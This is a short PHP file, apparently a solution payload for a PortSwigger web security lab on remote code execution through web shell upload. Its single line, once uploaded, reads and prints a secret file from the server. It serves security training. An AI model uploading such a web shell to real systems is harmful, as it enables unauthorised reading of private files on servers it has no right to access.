<?php
    // PHP command to solve the following lab:
    // https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
    echo file_get_contents('/home/carlos/secret');
?>
